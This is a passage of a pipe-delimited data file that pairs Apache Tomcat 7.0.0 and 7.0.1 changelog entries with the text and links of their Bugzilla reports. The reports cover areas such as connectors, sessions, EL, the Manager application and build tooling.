The attached patch makes it configurable by introducing an ""encoding"" parameter. This parameter can take one of two special values ""default"" or ""system"". Every other value will be interpreted as a name of an character set, e.g ""utf-8"".

The meaning of the two special values are as follows:

 default: use ISO-8859-1. This value will also be used, if no parameter was specified, or if it is empty

 system: the jvm will be asked for the default charset. This charset will usually be set by system locale.

Together with this functional change, there are two minor changes and one bigger changes hidden. First use of annotation ""Override"" at overriden methods. Second use of keyword ""static"" for the ResponseWrapper, since it has no reference to outer class. The third and somewhat bigger change is use of HttpServletResponse#setCharacterEncoding(encoding) instead of manipulating the content-type."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49478
Catalina|Tomcat 7.0.1 (markt)|fix|49503|Make sure connectors bind to their associated ports sufficiently early to allow jsvc and the org.apache.catalina.startup.EXIT_ON_INIT_FAILURE system property to operate correctly. (markt)|Connectors do not bind to their ports in Catalina.load(), but only later in start()|"Testing with trunk at revision 957942, thus this supposedly affects 7.0.0 as well.

In TC6 there is a separate pre-startup phase when starting Tomcat, to allow Connectors to bind to their ports before other parts of Tomcat are started.

IIRC, it is implemented by having separate Bootstrap#load(String[]) and Bootstart#start() methods [1].

[1] http://commons.apache.org/daemon/jsvc.html#Downgrading_user


When running with jsvc it will mean that Tomcat would not be able to bind to privileged ports (80).

I do not use jsvc, but I observe this issue when testing the fix for bug 49030 + bug 48625 that I applied in r957960. Essentially, it breaks the fix for BZ 48625.

To reproduce:

1. Add the following line to conf/catalina.properties

org.apache.catalina.startup.EXIT_ON_INIT_FAILURE=true

2. Start two Tomcat instances with the same configuration at the same time. The first instance starts successfully. The second instance fails, as expected, but not in the expected way.

3. Expected behaviour:

I would expect that in StandardService#initInternal() the connector.init() call fails, because it cannot bind to the port.

The exception from connector.init() is caught there and, if EXIT_ON_INIT_FAILURE flag is set, it is rethrown, then caught in Catalina#load() and then rethrown as an Error, which aborts Tomcat startup.


4. Actual behaviour:

The exception does not happen, because the connector does not try to bind to the port. It will bind when start() is called.

The startup sequence continues and then fails in Server.await()."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49503
Catalina|Tomcat 7.0.1 (markt)|fix|49525|Ensure cookies for the ROOT context have a path of / rather than an empty string. (markt)|IE8: Unabled to store data in HttpSession (root context)|"Environment:

Tomcat 7.0.0 Beta
IE8

A simplest webapp only have a test.jsp below:

<%=request.getSession().getId()%>

this app installed as root context

the test.jsp works fine in firefox

but when using IE8

there is always a different session id where refresh the test page.

BTW: the test.jsp works find in Tomcat 6.x"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49525
Catalina|Tomcat 7.0.1 (markt)|fix||49528, 49567: Ensure that AsyncContext.isAsyncStarted() returns the correct value after AsyncContext.start() and that if AsyncContext.complete() is called on a separate thread that it is handled correctly. (markt)|HttpServletRequest.isAsyncStarted() returns false when a Runnable is started|"Created attachment 25667 [details]
Servlet 3.0 isAsyncStarted testcase

In the attached example, an async request is created, but within a Runnable started using AsyncContext.start() the isAsyncStarted() returns false. 

This conflicts with the servlet 3.0 specification. Quoting chapter ""2.3.3.3 Asynchronous processing"" : ""
  public boolean isAsyncStarted() - Returns true if async processing
  has started on this request, and false otherwise. If this request has been
  dispatched using one of the AsyncContext.dispatch methods since it was
  put in asynchronous mode, or a call to AsynContext.complete is made, this
  method returns false.
""

This output is generated by Tomcat 7.0.0:

Start async()
Dispatching start()
request.isAsyncStarted()1true
Returning from doGet()
request.isAsyncStarted()2false
Before sleep()
After sleep()
request.isAsyncStarted()3false
Returning from run()
request.isAsyncStarted()4false

The following output is what we would expect and what Jetty v8.0 generates:

Start async()
Dispatching start()
request.isAsyncStarted()1true
Returning from doGet()
request.isAsyncStarted()2true
Before sleep()
After sleep()
request.isAsyncStarted()3true
Returning from run()
request.isAsyncStarted()4false"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49528
Catalina|Tomcat 7.0.1 (markt)|fix|49530|Contexts and Servlets not stopped when Tomcat is shut down. (markt)|Context is not correctly stopped at shutdown|"Created attachment 25669 [details]
Application that show the behavior

Apparently a web application context is not correctly stopped when shutting down Tomcat 7.0.0. I noticed that the destroy() method of a Servlet that's loaded on startup was not called, and put together a test case (see attached files). 

The test servlet writes to System.out on init() and destroy(), the output on init appears in logs/catalina.out, but no output on destroy. From what I  understand of the attached log, the context isn't stopped at all.

Steps to reproduce:
1. copy attached startupServlet.war to webapps
2. start Tomcat, then ""StartTestServlet.init"" appears in catalina.out
3. stop Tomcat

Actual Result:
no output appears in logs/catalina.out

Expected Result:
""StartTestServlet.destroy"" appears in catalina.out
catalina.log shows evidence of context /startupServlet being stopped


FWIW:
java -version:
java version ""1.6.0_20""
Java(TM) SE Runtime Environment (build 1.6.0_20-b02)
Java HotSpot(TM) 64-Bit Server VM (build 16.3-b01, mixed mode)

uname -a
Linux <hostname> 2.6.32-22-generic #36-Ubuntu SMP Thu Jun 3 19:31:57 UTC 2010 x86_64 GNU/Linux"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49530
Catalina|Tomcat 7.0.1 (markt)|fix|49536|If no ROOT context is deployed, ensure a 404 rather than a 200 is returned for requests that don't map to any other context. (markt)|If no webapps deployed, accessing a URL returns 200 OK with no content instead of 404|"Hello

I've just downloaded http://mirror.veriportal.com/apache/tomcat/tomcat-7/v7.0.0-beta/bin/apache-tomcat-7.0.0.zip

If I start a Tomcat 7 instance with no webapps on it and access a URL, it returns HTTP code 200 OK with no content, instead of an HTTP error 404.

Cheers

S. Ali Tokmen
http://ali.tokmen.com/"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49536
Catalina|Tomcat 7.0.1 (markt)|add||Additional debug logging in StandardContext to provide information on Manager selection. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|fix|49550|Suppress deprecation warning where deprecated code is required to be used. No functional change. Patch provided by Sebb. (markt)|[PATCH] Response class fix isSpace (deprecated) => isWhiteSpace|"Created attachment 25703 [details]
fix isSpace (deprecated) => isWhiteSpace

As the subject says"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49550
Catalina|Tomcat 7.0.1 (markt)|fix|49551|Allow default context.xml location to be specified using an absolute path. (markt)|When setting absolute path to default context.xml, in ContextConfig.contextConfig() it cannot be found|"Hi,

I'm using an Embedded Tomcat.
I want to use the Tomcat's functionality - default context.xml.

I'm extending the org.apache.catalina.startup.ContextConfig.
Sometimes the default context.xml is outside of the ""base"" directory, because of this I'm using the following method to set the location - in the java doc it is stated that an absolute path is acceptable for method parameter.

http://svn.apache.org/repos/asf/tomcat/tc6.0.x/tags/TOMCAT_6_0_26/java/org/apache/catalina/startup/ContextConfig.java

218    /**
219     * Set the location of the default context file
220     *
221     * @param path Absolute/relative path to the default context.xml
222     */
223    public void setDefaultContextXml(String path) {
224
225        this.defaultContextXml = path;
226
227    }

When ContextConfig.contextConfig() method is invoked, a wrong path is generated for the default context.xml
i.e.

If the base directory is d:/base-dir
and the path to the default context.xml is d:/other-dir/configuration/context.xml

the following is generated:
d:/base-dir/d:/other-dir/configuration/context.xml

This happens in ContextConfig.java:

715    /**
716     * Process the default configuration file, if it exists.
717     */
718    protected void contextConfig() {
          ...
728            processContextConfig(new File(getBaseDir()), defaultContextXml);
          ...
734    }

737    /**
738     * Process a context.xml.
739     */
740    protected void processContextConfig(File baseDir, String resourceName) {
          ...
749        File file = baseDir;
750        if (resourceName != null) {
751            file = new File(baseDir, resourceName);
752        }
          ...
819    }

Could you please clarify whether it is possible to use this setter method with absolute paths?

Thanks in advance
Regards"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49551
Catalina|Tomcat 7.0.1 (markt)|add||Improve logging of unhandled exceptions in servlets by including the path of the context where the error occurred. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|add||Include session ID in error message logged when trying to set an attribute on an invalid session. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|fix||Improve the CSRF protection filter by using SecureRandom rather than Random to generate nonces. Also make the implementation class used user configurable. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|fix||Avoid NullPointerException, when copyXML=true and META-INF/context.xml does not exist. (kfujino)|||
Catalina|Tomcat 7.0.1 (markt)|fix|49598|When session is changed and the session cookie is replaced, ensure that the new Set-Cookie header overwrites the old Set-Cookie header. (markt)|Session update fails and adds second cookie header without header name|"The following code in a Servlet or JSP will cause invalid session cookies to be sent to the client:

HttpSession session = req.getSession(true);
session.invalidate();
req.getSession(true);

Essentially the client will still see the old session cookie and then try and use the now invalidated session, breaking most applications that do this."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49598
Catalina|Tomcat 7.0.1 (markt)|fix||Create a thread to trigger asynchronous timeouts when using the BIO connector, change the default timeout to 10s (was infinite) and make the default timeout configurable using the asyncTimeout attribute on the connector. (pero/markt)|||
Catalina|Tomcat 7.0.1 (markt)|fix|49600|Make exceptions returned by the ProxyDirContext consistent for resources that weren't found by checking the DirContext or the cache. Test case based on a patch provided by Marc Guillemot. (markt)|Bad exception thrown by ProxyDirContext.lookup|"Created attachment 25766 [details]
Unit tests illustrating the problems

Two problems with exception thrown by ProxyDirContext.lookup

- ProxyDirContext.lookup throws notFoundException when the entry doesn't exist. notFoundException is a field and therefore initialized at ProxyDirContext creation.

The consequence is that the exception thrown contains a stacktrace that has nothing to do with the current execution stack. This makes difficult to find the root cause of a problem. If this is really an optimization (what is the gain), then what about making this field static?

- ProxyDirContext.lookup is not consistent: for the same call it may throw NamingException or NameNotFoundException depending whether the cache has been used or not.

Problems occur in Tomcat 6 and 7."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49600
Catalina|Tomcat 7.0.1 (markt)|fix|49613|Improve performance when using SSL for applications that make multiple class to Request.getAttributeNames(). Patch provided by Sampo Savolainen. (markt)|Request.getAttributeNames() slows down some applications||https://bz.apache.org/bugzilla/show_bug.cgi?id=49613
Catalina|Tomcat 7.0.1 (markt)|fix||Handle the edge cases where resources packaged in JARs have names that start with a single quote character or a double quote character. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|fix||Correct copy and paste typo in web.xml parsing rules that mixed up local-ejb-ref and resource-env-ref. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|update||Refactor session managers to remove unused code and to reduce code duplication. Also, all session managers used for session replication now extend org.apache.catalina.ha.session.ClusterManagerBase. (markt)|||
Jasper|Tomcat 7.0.1 (markt)|update||Remove references to Jikes since it does not support Java 6. (markt)|||
Jasper|Tomcat 7.0.1 (markt)|fix||Correct over zealous type checking for EL in attributes that broke the use of JSF converters. (markt)|||
Jasper|Tomcat 7.0.1 (markt)|fix||Correct algorithm used to identify correct method to use when a MethodExpressions is used in EL. (markt)|||
Jasper|Tomcat 7.0.1 (markt)|fix|49217|Ensure that identifiers used in EL meet the requirements of the Java Language Specification. (markt)|Accepting java keyword in EL|"According to EL, the Whatever comes to the right of the dot operator must follow normal Java naming rules for identifiers. For example it must not be a Java Key word (Here the example is shown for int, which is a Java key word).

// Java Bean
package library;
public class Book {
private String title;
public void setInt(String title) {
this.title = title;
}
public String getInt() {
return title;
}
}
// JSP
<%
library.Book book = new library.Book();
book.setInt(""sample title"");
request.setAttribute(""book"", book);
%>
${book.int}
//OUTPUT
sample title"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49217
Jasper|Tomcat 7.0.1 (markt)|add||Improve logging of JSP exceptions by including JSP snippet (if enabled) rather than just the root cause in the host log. (markt)|||
Jasper|Tomcat 7.0.1 (markt)|fix|49555|Correctly handled Tag Libraries where functions are defined in static inner classes. (markt)|Custom Taglibs should support all parameters|"I added two method <function>s with the same name but with an addition parameters.  I get this error:

org.apache.jasper.JasperException: Duplicate function name list in tag library /WEB-INF/dataStore.tld

Crap!  It is not even looking at the parameters.  Ok, Java matches on method names and method parameters.  It is commonly called a method signature. 

Well, Jasper is in the Google SDK, so it could perhaps be smarter than I am -- so maybe I overlooked something.  Is that the case?

Why can't the Jasper compiler match on parameters like Java?  This is after all Java.  I'm only using TLDs because they are cleaner then escaping Java code in JSP.  I have already wrote a considerable amount of TLD code and it does not easily mix with the expression language.  This is the reason why it is so important to have this implementation work as expected.

Please let me know how I can help.  Lets get this fixed.

-Jimmy

AppEngine SDK 1.3.2 (sorry, I don't know the embedded Jasper version)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49555
Cluster|Tomcat 7.0.1 (markt)|fix|49127|Don't swallow exceptions unnecessarily in SimpleTcpReplicationManager.startInternal(). (markt)|SimpleTcpReplicationManager.startInternal() ignores Exception|ha.session.SimpleTcpReplicationManager.startInternal() ignores Exception when invoking Thread.sleep() - it only needs to ignore InterruptedException.|https://bz.apache.org/bugzilla/show_bug.cgi?id=49127
Cluster|Tomcat 7.0.1 (markt)|fix|49407|Change the BackupManager so it is consistent with DeltaManager and reports both primary and backup sessions when active sessions are requested. (markt)|backup manager reports too few current sessions|With 100 sessions shared across 4 nodes (i.e. 25 active sessions per node), the delta manager reports 100 current sessions per node (25 active and the copies of the sessions from the other nodes). The back manager reports 25. For consistency it should report 50. The 25 active sessions plus the 25 (or so) that are backed up on that node.|https://bz.apache.org/bugzilla/show_bug.cgi?id=49407
Cluster|Tomcat 7.0.1 (markt)|fix|49445|When session ID is changed after authentication, ensure the DeltaManager replicates the change in ID to the other nodes in the cluster. (kfujino)|After session ID is changed on authentication, the session replication does not work.|"After r889716, 
session ID is changed on authentication. 
(default of changeSessionIdOnAuthentication is true. )
But DeltaManager doesn't notify other cluster nodes. 

Therefore, non-primary node keeps having old session ID. 
And, can not replicate of change of session attribute notified by new session ID. 

The workaround is ...
override changeSessionId method, and notify to change session ID.

BackupManager is OK. 
This problem is DeltaManager only.

Best regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49445
Web applications|Tomcat 7.0.1 (markt)|fix|49112|Update the ROOT web application's index page. Patch provided by pid. (markt)|MyFaces (JSF) lost it's support|"I have simple and standard MyFaces app. deployed, that worked successfully on 6.0.18 tomcat on the same OS(Ubuntu kernel 2.6.31-20-generic, i686).

After deploy on 6.0.26 it stops to work correctly.

1)
message bundles not recognized,

code like that not working:

<h:commandButton value=""#{message.abc}""/>

it does not see the message, treats all the #{message.abc} like a simple string.


2)
In select boxes it does not recognize value listeners. treats them like simple strings.

It seems TomCat became unaware of JSF presence in the app.

Deployment details:

All jsf libs are under MY_WEB_APP/WEB_INF/lib, in tomcat libs I have nothing of mine.

""myfaces"" version used is 1.2.5"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49112
Web applications|Tomcat 7.0.1 (markt)|fix|49213|Add the permissions necessary to enable the Manager application to operate currently when running with a security manager. (markt)|Manager application doesn't work in security mode|"In the manager application, the sessions page doesn't work when I launch Tomcat with -security argument. I had to add the following permissions :
    grant codeBase ""file:${catalina.home}/webapps/manager/-"" {
        permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina"";
        permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.manager"";
        permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.manager.util"";
    };"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49213
Web applications|Tomcat 7.0.1 (markt)|fix|49436|Correct documented default for readonly attribute of the UserDatabase component. (markt)|Documented default for UserDatabase readonly attribute wrong|"In version 6.0.26 org.apache.catalina.users.MemoryUserDatabase sets readonly = true. In version 5.5.29 org.apache.catalina.users.MemoryUserDatabase sets readonly = false. This means that the save method will default to logging an error message rather than saving the user database file.

    public void save()
        throws Exception
    {
        if(getReadonly())
        {
            log.error(sm.getString(""memoryUserDatabase.readOnly""));
            return;
        }

The message that is displayed in 6.0.26 is:
memoryUserDatabase.readOnly=User database has been configured to be read only. Changes cannot be saved

I cannot find any documentation or a JMX management bean to set readonly = false.
Hence the save method I was using in Tomcat 5.0.28 and tomcat 5.5.29 no longer works.

David Tugby"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49436
Web applications|Tomcat 7.0.1 (markt)|fix|49475|Use new role name for manager application access on the ROOT web application's index page. (markt)|Welcome page mentions obsolete role name|"Running 7.0.0, the welcome page says:
> NOTE: For security reasons, using the manager webapp is restricted to users with role ""manager""

The role name is wrong: in 7.0.0 the correct name for that role is ""manager-gui"".

Note, that it is easier to resolve bug 49122 before fixing this one."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49475
Web applications|Tomcat 7.0.1 (markt)|fix|49476|CSRF protection was preventing access to the session expiration features. Also switch the manager application to the generic CSRF protection filter. (markt)|Cannot expire selected session in Manager webapp|"Running 7.0.0. Steps to reproduce:

1. Login to the Manager webapp.

2. In the ""Sessions"" column click on the number (1) in the ""/manager"" row.
The Sessions Administration page`[1] is opened.

3. In the sessions list put a checkmark next to any session and press Invalidate selected Sessions button.

4. 
Actual result: message:
FAIL: Nonce mismatch. Command ""/sessions"" was ignored.

and the page displays the list of webapps.
Expected result: Invalidating a session and redisplaying the sessions list.


[1] http://localhost:8080/manager/html/sessions?path=/manager

Suspected cause is that [1] is opened with a GET query that does not include the nonce in its URL."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49476
Web applications|Tomcat 7.0.1 (markt)|fix||Better handle failure to create directories required for new hosts in the Host Manager application. (markt)|||
Web applications|Tomcat 7.0.1 (markt)|fix||Switch the Host Manager application to the generic CSRF protection for the HTML interface and prevent started hosts from being started and stopped hosts from being stopped. (markt)|||
Web applications|Tomcat 7.0.1 (markt)|fix|49518|Fix typo in extras documentation. (markt)|Typo in tomcat-7.0-doc/extras.html ?|"http://tomcat.apache.org/tomcat-7.0-doc/extras.html

says

""component builds a full fledged package renames commons-logging implementation""

s/renames/renamed/ ?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49518
Web applications|Tomcat 7.0.1 (markt)|fix|49522|Fix regression due to change of name for MBeans for naming resources that broke the complete server status page in the manager application. Note these MBeans now have a new name. (markt)|Complete Server status (status/all) causes stack trace|"type Exception report

message

description The server encountered an internal error () that prevented it from fulfilling this request.

exception

javax.servlet.ServletException: javax.management.AttributeNotFoundException:  Cannot find attribute startTime for org.apache.catalina.deploy.NamingResources@d1c778
	org.apache.catalina.manager.StatusManagerServlet.doGet(StatusManagerServlet.java:292)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:722)

root cause

javax.management.AttributeNotFoundException:  Cannot find attribute startTime for org.apache.catalina.deploy.NamingResources@d1c778
	org.apache.tomcat.util.modeler.ManagedBean.getGetter(ManagedBean.java:493)
	org.apache.tomcat.util.modeler.BaseModelMBean.getAttribute(BaseModelMBean.java:180)
	com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:666)
	com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638)
	org.apache.catalina.manager.StatusTransformer.writeContext(StatusTransformer.java:656)
	org.apache.catalina.manager.StatusTransformer.writeDetailedState(StatusTransformer.java:590)
	org.apache.catalina.manager.StatusManagerServlet.doGet(StatusManagerServlet.java:287)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:722)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49522
Web applications|Tomcat 7.0.1 (markt)|fix|49570|When using the example compression filter, set the Vary header on compressed responses. (markt)|The CompressionFilter example should support HTTP proxies to cache gzipped content better by sending Vary: Accept-Encoding header|"At the moment the Compression Filter example doesn't send the header ""Vary: Accept-Encoding"" with the compressed content (see method writeToGZip(..) in http://svn.apache.org/repos/asf/tomcat/trunk/webapps/examples/WEB-INF/classes/compressionFilters/CompressionResponseStream.java). 

From many sources like

1. http://httpd.apache.org/docs/2.0/mod/mod_deflate.html#proxies
2. http://developer.yahoo.net/blog/archives/2007/07/high_performanc_3.html

it looks like a ""Vary: Accept-Encoding"" header should be sent with the compressed content to make sure proxy servers can serve gzipped content correctly.

To enhance this example, the method writeToGzip(..) should be updated to send Vary: Accept-Encoding header like below:

public void writeToGZip(byte b[], int off, int len) throws IOException {
...
   response.addHeader(""Content-Encoding"", ""gzip"");
   response.addHeader(""Vary"", ""Accept-Encoding"");
   gzipstream = new GZIPOutputStream(output);
...
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49570
Web applications|Tomcat 7.0.1 (markt)|add||Add redirects for the root of the manager and host-manager web applications that redirect users to the html interface rather than returning a 404. (markt)|||
Web applications|Tomcat 7.0.1 (markt)|add||Provide the HTML Manager application with the ability to differentiate between primary, backup and proxy sessions. Note that proxy sessions are only shown if enabled in web.xml. (markt)|||
Other|Tomcat 7.0.1 (markt)|fix|49130|Better describe the core package in the Windows installer, making it clear that the service will be installed. Patch provided by sebb. (markt)|NSIS - clarify that service is always installed|"Created attachment 25300 [details]
Change installer wording as described

I found the Service option text in the Windows installer a bit unclear:

Service: Automatically start Tomcat when the computer is started.

This could mean that the service won't be installed if the box is not selected.

It might be clearer if the option were renamed ""AutoStart"", and the core description updated to state that the service is created."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49130
Other|Tomcat 7.0.1 (markt)|add||Re-factor unit tests to enable them to be run once with each of the HTTP connector implementations (BIO, NIO and APR/native). (markt)|||
Other|Tomcat 7.0.1 (markt)|add|49268|Add the necessary plumbing to include CheckStyle in the build process. Start with no checks. Additional checks will be added as they are agreed. (markt)|Use checkstyle to enforce common code style|"Created attachment 25423 [details]
Patch adding target checkstyle to main build.xml with a extrem minimal number of checks

Tomcat code style is not consistent but it should be (it would give more time to discuss about unit tests rather than about code style).

Rather than to propose a huge patch in one time, I propose a simple one that:
- adds a checkstyle target to the build.xml
- adds a chestyle.xml configuration file (the ""sun coding conventions"") with nearly everything deactivated (otherwise it gives over 80000 style errors)
- activates only check for tabs

With this check the checkstyle target fails as a lot of files still contain a tab character. A find / replace by a committer makes far more sense than providing it in the patch as it would be more difficult to review.

Of course it would make sense to add this target to the default build.

Once this patch has been applied, work can start on other checkers, like the one verifying the presence of Version Javdoc tag in the right format."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49268
Other|Tomcat 7.0.1 (markt)|update||Updated to Ant 1.8.1. The build now requires a minimum of Ant 1.8.x. (markt)|||
Other|Tomcat 7.0.1 (markt)|update||Update the re-packaged version of commons-fileupload from 1.2.1 to 1.2.2. The layout of re-packaged version was also restored to the original commons-fileupload layout to make merging of future updates easier. (markt)|||
Other|Tomcat 7.0.1 (markt)|update||Update the re-packaged version of Jakarta BCEL from trunk revision 880760 to trunk revision 978831. (markt)|||
Catalina|Tomcat 7.0.0 (markt)|update||Update Servlet support to the Servlet 3.0 specification. (all)|||
Catalina|Tomcat 7.0.0 (markt)|update||Improve and document VirtualWebappLoader. (rjung)|||
Catalina|Tomcat 7.0.0 (markt)|add|43642|Add prestartminSpareThreads attribute for Executor. (jfclere)|Add prestartminSpareThreads attribute for Executor|"The attached patch adds the boolean attribute prestartminSpareThreads to the
Executor element. This allows the admin to prestart minspareThreads for this
Executor during the start of Tomcat. The default value is false which is the old
behaviour. A documentation patch for executor.xml can be created if there is
interest in committing this patch."|https://bz.apache.org/bugzilla/show_bug.cgi?id=43642
Catalina|Tomcat 7.0.0 (markt)|update||Switch from AnnotationProcessor to InstanceManager. Patch provided by David Jecks with modifications by Remy. (remm/fhanik)|||
Catalina|Tomcat 7.0.0 (markt)|update||r620845 and r669119. Make shutdown address configurable. (jfclere)|||https://svn.apache.org/viewvc?view=rev&rev=620845
Catalina|Tomcat 7.0.0 (markt)|fix||r651977 Add some missing control checks to ThreadWithAttributes. (markt)|||https://svn.apache.org/viewvc?view=rev&rev=651977
Catalina|Tomcat 7.0.0 (markt)|add||r677640 Add a startup class that does not require any configuration files. (costin)|||https://svn.apache.org/viewvc?view=rev&rev=677640
Catalina|Tomcat 7.0.0 (markt)|fix||r700532 Log if temporary file operations within the CGI servlet fail. Make sure header Reader is closed on failure. (markt)|||https://svn.apache.org/viewvc?view=rev&rev=700532
Catalina|Tomcat 7.0.0 (markt)|fix||r708541 Delete references to DefaultContext which was removed in 6.0.x. (markt)|||https://svn.apache.org/viewvc?view=rev&rev=708541
Catalina|Tomcat 7.0.0 (markt)|add||r709018 Initial implementation of an asynchronous file handler for JULI. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=709018
Catalina|Tomcat 7.0.0 (markt)|fix||Give session thisAccessedTime and lastAccessedTime clear semantics. (rjung)|||
Catalina|Tomcat 7.0.0 (markt)|add||Expose thisAccessedTime via Session interface. (rjung)|||
Catalina|Tomcat 7.0.0 (markt)|add||Provide a log format for JULI that provides the same information as the default but on a single line. (markt)|||
Catalina|Tomcat 7.0.0 (markt)|add||r723889 Provide the ability to configure the Executor job queue size and a timeout for adding jobs to the queue. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=723889
Catalina|Tomcat 7.0.0 (markt)|add||Add support for aliases to StandardContext. This allows content from other directories and/or WAR files to be mapped to paths within the context. (markt)|||
Catalina|Tomcat 7.0.0 (markt)|update||Provide clearer definition of Lifecycle interface, particularly start and stop, and align components that implement Lifecycle with this definition. (markt)|||
Catalina|Tomcat 7.0.0 (markt)|add|48662|Provide a new option to control the copying of context XML descriptors from web applications to the host's xmlBase. Copying of XML descriptors is now disabled by default. (markt)|context.xml expansion on deployment improvements|"Two parts:

1. Log a warning/info message if Tomcat ignores a bundled context.xml in favour of one in CATALINA_BASE/<engine name>/<host name>

2. Make the extraction/copying of context.xml configurable, probably via a new attribute extractXml on the host"|https://bz.apache.org/bugzilla/show_bug.cgi?id=48662
Catalina|Tomcat 7.0.0 (markt)|fix||Move comet classes from the org.apache.catalina package to the org.apache.catalina.comet package to allow comet to work under a security manager. (markt)|||
Coyote|Tomcat 7.0.0 (markt)|update||Port SSLInsecureRenegotiation from mod_ssl. This requires to use tomcat-native 1.2.21 that have option to detect this support from OpenSSL library. (mturk)|||
Coyote|Tomcat 7.0.0 (markt)|update||Allow bigger AJP packets also for request bodies and responses using the packetSize attribute of the Connector. (rjung)|||
Coyote|Tomcat 7.0.0 (markt)|update||r703017 Make Java socket options consistent between NIO and JIO connector. Expose all the socket options available on java.net.Socket (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=703017
Coyote|Tomcat 7.0.0 (markt)|fix|46051|The writer returned by getWriter() now conforms to the PrintWriter specification and uses platform dependent line endings rather than always using \r\n. (markt)|Servlet response writer does not respect line.separator system property|"Created attachment 22763 [details]
remove special CoyoteWriter println handling

public void doGet(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
  response.setContentType(""text/plain"");
  PrintWriter writer = response.getWriter();
  writer.print(""hello world"");
  writer.println(); //FIXME ignores System.getProperty(""line.separator"") and always outputs \r\n
  return;
}

This means that if you use a servlet Writer on a Unix system to output any text based data format which is defined as requiring Unix format line endings ('\n'), that data will be corrupted.

This appears to be because org.apache.catalina.connector.CoyoteWriter does:
--------
private static final char[] LINE_SEP = { '\r', '\n' };

public void println() {
  write(LINE_SEP);
}
--------

This used to work in Tomcat 4.

Looking at the old code at http://svn.apache.org/repos/asf/tomcat/archive/tc4.0.x/tags/tc4.0.6/connectors/coyote/src/java/org/apache/coyote/tomcat4/CoyoteWriter.java it appears to defer line endings to the PrintWriter base class which does the right thing.

Was this change was made to output HTTP headers properly or something?  It specifically seems to override the default behavior to do this.  I don't know the code well enough to determine if the attached patch to revert to the default behavior again would break something?

Thanks for your consideration."|https://bz.apache.org/bugzilla/show_bug.cgi?id=46051
Coyote|Tomcat 7.0.0 (markt)|update||Use tc-native 1.2.x which is based on APR 1.3.3+ (mturk)|||
Coyote|Tomcat 7.0.0 (markt)|update||r724239 NIO connector now always uses an Executor. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=724239
Coyote|Tomcat 7.0.0 (markt)|update||r724393 Implement keepAliveCount for NIO connector in a thread safe manner. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=724393
Coyote|Tomcat 7.0.0 (markt)|update||r724849 Implement keep alive timeout for NIO connector. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=724849
Jasper|Tomcat 7.0.0 (markt)|update||Update JSP support to the JSP 2.2 specification. (markt)|||
Jasper|Tomcat 7.0.0 (markt)|update||Update EL support to the EL 2.2 specification. (markt)|||
Jasper|Tomcat 7.0.0 (markt)|update||"r787978 Use ""1.6"" as the default value for compilerSourceVM and compilerTargetVM options of Jasper. (kkolinko)"|||https://svn.apache.org/viewvc?view=rev&rev=787978
Jasper|Tomcat 7.0.0 (markt)|add|48358|Add support for limiting the number of JSPs that are loaded at any one time. Based on a patch by Isabel Drost. (markt)|JSP-unloading reloaded|"Created attachment 24684 [details]
Patch including tests that fixed the problem for us.

Currently Tomcat does not support unloading JSPs. When constantly changing and reloading JSP files (especially during development time) this causes the JVM to run out of memory.

The patch fixes this problem by tracking the last time a JSP page was requested. Objects are destroyed if a configurable number of JSPs is live, starting with the ""oldest"" ones. This behaviour is deactivated by default. It must be configured explicitly.

The patch comes with tests that check the added functionality. To make testing easier I added easymock as dependency to the classpath.

I'd appreciate any feedback on the code changes - suggestions for improvement, potential problems with the code etc.

This work was done in collaboration with some of my colleagues at work. I will forward a link to this bug entry to those involved so they can provide more information on the background of the patch if needed.

On a side note: Just in case you might like to include the patch - I couldn't find a ""patch intended for inclusion"" check box (like the one in jira) in bugzilla - thus stating explicitly: License to ASF granted for inclusion in ASF works (as per the Apache License ¬ß5)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48358
